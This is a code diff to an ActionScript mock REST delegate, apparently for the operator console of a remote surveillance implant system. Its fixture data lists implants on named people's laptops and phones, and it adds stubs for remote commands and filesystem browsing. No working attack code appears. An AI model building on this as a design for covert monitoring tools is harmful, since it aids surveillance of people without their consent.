@@ -20,10 +20,7 @@ package it.ht.rcs.console.agent.rest
       // AGENTS
       
       // John Doe (SwordFish)
-      new Agent({ _id: "a1", _kind: "agent", name: "Laptop (1)",      desc:"John's Laptop",               status: "open",   path :["o1", "t1"], type: "desktop", platform: "osx",     version: 10, ident:"RCS_0000000001", counter: 1, upgradable: false, stat: new Stat({ _id: "s1", last_sync: 1307515166,
-                                                                                                                                                                                                                                                                  evidence:  new StatEvidence({camera: 150}),
-                                                                                                                                                                                                                                                                  dashboard: new StatEvidence({camera: 20}),
-                                                                                                                                                                                                                                                                  grid_size: 0, size: 0, source: "1.2.3.4", user: "John", device: "device" }),
+      new Agent({ _id: "a1", _kind: "agent", name: "Laptop (1)",      desc:"John's Laptop",               status: "open",   path :["o1", "t1"], type: "desktop", platform: "osx",     version: 10, ident:"RCS_0000000001", counter: 1, upgradable: false, stat: new Stat({ _id: "s1", last_sync: 1307515166, evidence: null, grid_size: 0, size: 0 }),
         configs: [new Config({config: DefaultConfigBuilder.getDefaultConfigAsString(new Agent({type: 'desktop'}))})] }),
       new Agent({ _id: "a2", _kind: "agent", name: "Mobile (1)",      desc:"John's Android Mobile",       status: "open",   path :["o1", "t1"], type: "mobile",  platform: "android", version: 10, ident:"RCS_0000000002", counter: 1, upgradable: false, stat: new Stat({ _id: "s2", last_sync: 1307524166, evidence: null, grid_size: 0, size: 0 }),
         configs: [new Config({config: DefaultConfigBuilder.getDefaultConfigAsString(new Agent({type: 'mobile'}))})] }),
@@ -33,10 +30,12 @@ package it.ht.rcs.console.agent.rest
       // Joey Fargo (SwordFish)
       new Agent({ _id: "a4", _kind: "agent", name: "Joey mac (1)",    desc:"Joey's Mac",                  status: "open",   path :["o1", "t3"], type: "desktop", platform: "osx",        version: 10, ident:"RCS_0000000004", counter: 1, upgradable: false, stat: new Stat({ _id: "s4", last_sync: 1308514166, evidence: null, grid_size: 0, size: 0 }),
         configs: [new Config({config: DefaultConfigBuilder.getDefaultConfigAsString(new Agent({type: 'desktop'}))})] }),
-      new Agent({ _id: "a5", _kind: "agent", name: "Joey pc (1)",     desc:"Joey's PC",                   status: "open",   path :["o1", "t3"], type: "desktop", platform: "windows",    version: 10, ident:"RCS_0000000004", counter: 2, upgradable: false, stat: new Stat({ _id: "s5", last_sync: 1307512166, evidence: null, grid_size: 0, size: 0 }),
+      new Agent({ _id: "a5", _kind: "agent", name: "Joey pc (1)",     desc:"Joey's PC",                   status: "open",   path :["o1", "t3"], type: "desktop", platform: "windows",    scout:true, version: 10, ident:"RCS_0000000004", counter: 2, upgradable: false, stat: new Stat({ _id: "s5", last_sync: 1307512166, evidence: null, grid_size: 0, size: 0 }),
         configs: [new Config({config: DefaultConfigBuilder.getDefaultConfigAsString(new Agent({type: 'desktop'}))})] }),
       new Agent({ _id: "a6", _kind: "agent", name: "Joey cell (1)",   desc:"Joey's Mobile",               status: "open",   path :["o1", "t3"], type: "mobile",  platform: "blackberry", version: 10, ident:"RCS_0000000005", counter: 3, upgradable: false, stat: new Stat({ _id: "s6", last_sync: 1307514166, evidence: null, grid_size: 0, size: 0 }),
         configs: [new Config({config: DefaultConfigBuilder.getDefaultConfigAsString(new Agent({type: 'mobile'}))})] }),
+      
+     
       
       // Guido (Blackjack)
       new Agent({ _id: "a7", _kind: "agent", name: "Guido pc (1)",    desc:"Guido's PC",                  status: "open",   path :["o2", "t4"], type: "desktop",  platform: "windows", version: 10, ident:"RCS_0000000006", counter: 1, upgradable: false, stat: new Stat({ _id: "s7", last_sync: 1305514166, evidence: null, grid_size: 0, size: 0 }),
@@ -172,9 +171,13 @@ package it.ht.rcs.console.agent.rest
     
     public function downloads(agent:Agent, onResult:Function=null, onFault:Function=null):void {}
     
+    public function filesystems(agent:Agent, onResult:Function=null, onFault:Function=null):void {}
+    
     public function create_download(agentId:String, path:String, onResult:Function=null, onFault:Function=null):void {}
     
     public function destroy_download(agent:Agent, downloadId:String, onResult:Function=null, onFault:Function=null):void {}
+    
+    public function destroy_filesystem(agent:Agent, filesystemId:String, onResult:Function=null, onFault:Function=null):void {}
     
     public function destroy_upload(agent:Agent, downloadId:String, onResult:Function=null, onFault:Function=null):void {}
     
@@ -187,6 +190,14 @@ package it.ht.rcs.console.agent.rest
     public function move(agentId:String, targetId:String, onResult:Function=null, onFault:Function=null):void {}
     
     public function activate_ghost(agent:Agent, sync:Array, onResult:Function=null, onFault:Function=null):void{}
+    
+    public function create_command(agent:Agent, command:String, onResult:Function=null, onFault:Function=null):void{}
+    
+    public function commands(agent:Agent, onResult:Function=null, onFault:Function=null):void {}
+    
+    public function destroy_command(agent:Agent, commandId:String, onResult:Function=null, onFault:Function=null):void{}
+    
+    public function destroy_factory(id:String, permanent:Boolean=false, onResult:Function=null, onFault:Function=null):void{};
     
   }
   
